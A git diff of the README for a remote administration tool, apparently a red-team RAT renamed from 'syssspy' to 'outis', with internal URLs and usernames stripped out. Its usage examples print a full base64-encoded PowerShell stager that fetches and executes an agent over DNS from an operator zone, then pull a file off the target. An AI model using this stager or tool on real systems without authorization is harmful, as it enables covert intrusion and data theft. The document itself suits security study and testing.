@@ -1,5 +1,13 @@
 
-syssspy is a custom Remote Administration Tool (RAT) or something like than. Think Meterpreter or Empire-Agent. However, the focus of this tool is neither an exploit toolkit (there are no exploits) nor persistant management of targets. The focus is to communicate between server and target system and to transfer files, share sockets, spawn shells and so on using varios methods and platforms.
+outis is a custom Remote Administration Tool (RAT) or something like than. Think Meterpreter or Empire-Agent. However, the focus of this tool is neither an exploit toolkit (there are no exploits) nor persistant management of targets. The focus is to communicate between server and target system and to transfer files, share sockets, spawn shells and so on using varios methods and platforms.
+
+
+On the Name
+===========
+
+The cyclops Polyphemus in Homer's Odyssey had some issues with name resolution. When he asked for Odysseus' name, the hacker told him it is "Outis" meaning "Nobody" in ancient Greek. Thus, when Polyphemus later shouted, that Nobody was about to kill him, strangly no help arrived.
+
+My thanks to Marcel for remembering this marvelous piece of classic tale.
 
 
 Dependencies for the Handler
@@ -26,9 +34,9 @@ Also, older versions might cause problems:
 You can set up a python virtual environment quite easily:
 
 ```
-$ virtualenv syssspy-venv
-$ source ./syssspy-venv/bin/activate
-(syssspy-venv) $ pip install progressbar2 dnspython pycrypto pyopenssl
+$ virtualenv outis-venv
+$ source ./outis-venv/bin/activate
+(outis-venv) $ pip install progressbar2 dnspython pycrypto pyopenssl
 ```
 
 This results to the following package list, which seems to work for me:
@@ -58,19 +66,12 @@ Installation
 Clone this git with recursive flag to also clone its submodules in the thirdpartytools folder:
 
 ```
-git clone --recursive git@git.syss.intern:finn.steglich/syssspy.git
+git clone --recursive ...
 ```
 
 The handler runs on Python 3. Install its dependencies and run it. It will generate stagers, agents and everything else for you.
 
-To bind low ports without needing root privileges, consider using the wrapper binary in my capability-wrappers collection:
-
-```
-git clone https://git.syss.intern/finn.steglich/capability-wrappers.git
-cd capability-wrappers
-vim syssspy.c # to edit the paths
-make syssspy
-```
+To bind low ports without needing root privileges, consider using a capability wrapper.
 
 
 Terms
@@ -115,7 +116,7 @@ Currently Supported Commands and Controls
 Currently Supported Extras
 ==========================
 
- * When using DNS transport with stager and powershell, you can stage the tool dnscat2 / dnscat2-powershell from the thirdpartytools directory instead of the default syssspy agent. Set the platform option AGENTTYPE to DNSCAT2 (will take a while, but uses only DNS to stage) or DNSCAT2DOWNLOADER (tries to download using HTTPS).
+ * When using DNS transport with stager and powershell, you can stage the tool dnscat2 / dnscat2-powershell from the thirdpartytools directory instead of the default outis agent. Set the platform option AGENTTYPE to DNSCAT2 (will take a while, but uses only DNS to stage) or DNSCAT2DOWNLOADER (tries to download using HTTPS).
 
 
 Usage Examples
@@ -124,11 +125,11 @@ Usage Examples
 Download of a file using staged DNS transport with POWERSHELL platform could look like this:
 
 ```raw
-$ syssspy
-syssspy> set TRANSPORT DNS
-syssspy> set ZONE zfs.sy.gs
-syssspy> set AGENTDEBUG TRUE
-syssspy> info
+$ outis
+outis> set TRANSPORT DNS
+outis> set ZONE zfs.sy.gs
+outis> set AGENTDEBUG TRUE
+outis> info
 [+] Options for the Handler:
 Name               Value       Required  Description                                                      
 -----------------  ----------  --------  -----------------------------------------------------------------
@@ -161,12 +162,12 @@ STAGEAUTHENTICATION   TRUE                        True      Should the stager ve
                                                             before executing (RSA signature verification 
                                                             with certificate pinning) (Options: TRUE, 
                                                             FALSE)
-STAGECERTIFICATEFILE  $TOOLPATH/data/syssspy.pem  False     File path of a PEM with both RSA key and 
+STAGECERTIFICATEFILE  $TOOLPATH/data/outis.pem    False     File path of a PEM with both RSA key and 
                                                             certificate to sign and verify staged agent 
                                                             with (you can generate a selfsigned cert by 
                                                             using the script gencert.sh initially)
 AGENTTYPE             DEFAULT                     True      Defines which agent should be used (the 
-                                                            default syssspy agent for this plattform, or 
+                                                            default outis agent for this plattform, or 
                                                             some third party software we support) 
                                                             (Options: DEFAULT, DNSCAT2, DNSCAT2DOWNLOADER)
 TIMEOUT               9                           True      Number of seconds to wait for each request 
@@ -175,7 +176,7 @@ RETRIES               2                           True      Retry each request f
                                                             (currently only supported by DNS stagers)
 AGENTDEBUG            TRUE                        True      Should the agent print and log debug messages 
                                                             (Options: TRUE, FALSE)
-syssspy> generatestager
+outis> generatestager
 [+] Use the following stager code:
 powershell.exe -Enc JAByAD0ARwBlAHQALQBSAGEAbgBkAG8AbQA7ACQAYQA9ACIAIgA7ACQAdAA9ADAAOwBmAG8AcgAoACQAaQA9ADAAOwA7
   ACQAaQArACsAKQB7ACQAYwA9ACgAWwBzAHQAcgBpAG4AZwBdACgASQBFAFgAIAAiAG4AcwBsAG8AbwBrAHUAcAAgAC0AdAB5AHAAZQA9AFQAWA
@@ -199,37 +200,37 @@ powershell.exe -Enc JAByAD0ARwBlAHQALQBSAGEAbgBkAG8AbQA7ACQAYQA9ACIAIgA7ACQAdAA9
   VABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQAsACIAUwBIAEEANQAxADIAIgAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAG
   UANgA0AFMAdAByAGkAbgBnACgAJABzAGkAZwApACkAKQB7ACIARQBSAFIATwBSADIAIgA7AEUAeABpAHQAKAAyACkAfQA7ACIARwBPAEEARwBF
   AE4AVAAiADsASQBFAFgAIAAkAHMAOwA=
-syssspy> run
+outis> run
 [+] DNS listening on 0.0.0.0:53
 [+] Sending staged agent (34332 bytes)...
-100% (184 of 184) |###########################################################| Elapsed Time: 0:00:16 Time: 0:00:16
+100% (184 of 184) |########################################################| Elapsed Time: 0:00:16 Time: 0:00:16
 [+] Staging done
 [+] Waiting for connection and TLS handshake...
 [+] Initial connection with new agent started
 [+] Upgrade to TLS done
-syssspy session> [+] AGENT: Hello from Agent
+outis session> [+] AGENT: Hello from Agent
 
-syssspy session> download C:\Users\fsteglich\Desktop\testfile.txt /tmp/out.txt
-[+] initiating download of remote file C:\Users\fsteglich\Desktop\testfile.txt to local file /tmp/out.txt
+outis session> download C:\testfile.txt /tmp/out.txt
+[+] initiating download of remote file C:\testfile.txt to local file /tmp/out.txt
 [+] agent reports a size of 3295 bytes for channel 1
-100% (3295 of 3295) |#########################################################| Elapsed Time: 0:00:00 Time: 0:00:00
+100% (3295 of 3295) |######################################################| Elapsed Time: 0:00:00 Time: 0:00:00
 [+] wrote 3295 bytes to file /tmp/out.txt
-syssspy session> exit
+outis session> exit
 Do you really want to exit the session and close the connection [y/N]? y
-syssspy> exit
+outis> exit
 ```
 
-Or maybe we want to use dnscat2 for the real deal and just use syssspy to stage it:
+Or maybe we want to use dnscat2 for the real deal and just use outis to stage it:
 
 ```raw
-$ syssspy
-syssspy> set TRANSPORT DNS
-syssspy> set AGENTTYPE DNSCAT2
-syssspy> set ZONE zfs.sy.gs
-syssspy> run
+$ outis
+outis> set TRANSPORT DNS
+outis> set AGENTTYPE DNSCAT2
+outis> set ZONE zfs.sy.gs
+outis> run
 [+] DNS listening on 0.0.0.0:53
 [+] Sending staged agent (406569 bytes)...
-100% (2185 of 2185) |##########################################################| Elapsed Time: 0:01:17 Time: 0:01:17
+100% (2185 of 2185) |#######################################################| Elapsed Time: 0:01:17 Time: 0:01:17
 [+] Staging done
 [+] Starting dnscat2 to handle the real connection
 
@@ -276,9 +277,9 @@ This is a command session!
 That means you can enter a dnscat2 command such as
 'ping'! For a full list of clients, try 'help'.
 
-command (feynman-win7) 1> download c:/Users/fsteglich/Desktop/testfile.txt /tmp/out.txt
-Attempting to download c:/Users/fsteglich/Desktop/testfile.txt to /tmp/out.txt
-Wrote 3295 bytes from c:/Users/fsteglich/Desktop/testfile.txt to /tmp/out.txt!
+command (feynman-win7) 1> download c:/testfile.txt /tmp/out.txt
+Attempting to download c:/testfile.txt to /tmp/out.txt
+Wrote 3295 bytes from c:/testfile.txt to /tmp/out.txt!
 
 command (feynman-win7) 1> exit
 Input thread is over
@@ -314,14 +315,6 @@ This project was inspired by (and shamelessly stole part of its code from):
    * https://github.com/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1
      — powershell version of the dnscat2 agent
   
- * SySS-PoC-RAT from Matthias:
-   * https://git.syss.intern/syss-poc-rat
-     — for future implementation of transport module HTTP(S)
- 
- * Adrians ideas on DNS backchanneling:
-   * https://wiki.syss.intern/hackerwiki/index.php/DNS_Backchannel
-     — for future implementation of platform module bash
- 
  * dnsftp
    * https://github.com/breenmachine/dnsftp
      — short script parts for stagers via DNS
